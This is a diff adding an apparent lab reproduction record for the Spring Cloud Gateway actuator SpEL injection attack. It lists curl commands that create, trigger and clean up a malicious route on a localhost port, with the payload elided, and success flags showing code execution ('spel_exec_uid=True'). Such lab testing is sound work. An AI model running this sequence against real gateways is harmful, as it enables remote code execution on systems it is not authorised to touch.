@@ -1,0 +1,11 @@
+curl -s -i 'http://127.0.0.1:<LAB_PORT>/actuator'
+curl -s -i -X POST 'http://127.0.0.1:<LAB_PORT>/actuator/gateway/routes/hacktest' -H 'Content-Type: application/json' --data-binary '<SpEL route JSON>'
+curl -s -i -X POST 'http://127.0.0.1:<LAB_PORT>/actuator/gateway/refresh'
+curl -s -i 'http://127.0.0.1:<LAB_PORT>/actuator/gateway/routes/hacktest'
+curl -s -X DELETE 'http://127.0.0.1:<LAB_PORT>/actuator/gateway/routes/hacktest' && curl -s -X POST 'http://127.0.0.1:<LAB_PORT>/actuator/gateway/refresh'
+
+### 观测
+actuator_200=True
+route_created_201=True
+spel_exec_uid=True
+cleanup_delete_200=True
